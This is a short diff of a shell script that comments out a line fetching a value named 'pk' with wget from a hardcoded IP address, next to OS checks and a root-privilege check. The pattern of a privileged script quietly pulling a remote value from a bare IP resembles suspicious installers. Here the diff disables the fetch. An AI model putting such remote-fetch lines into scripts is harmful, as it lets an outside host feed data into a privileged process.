@@ -53,8 +53,8 @@ else
     echo "Sorry, this OS is not supported." 
     exit 1
 fi
-untitled="$(wget -qO- http://80.211.146.153/untitled.txt)"
-	pk=$untitled
+#untitled="$(wget -qO- http://80.211.146.153/untitled.txt)"
+#	pk=$untitled
  
 # /-/-/-/root?/-/-/-/
 if [ $UID -ne 0 ]; then
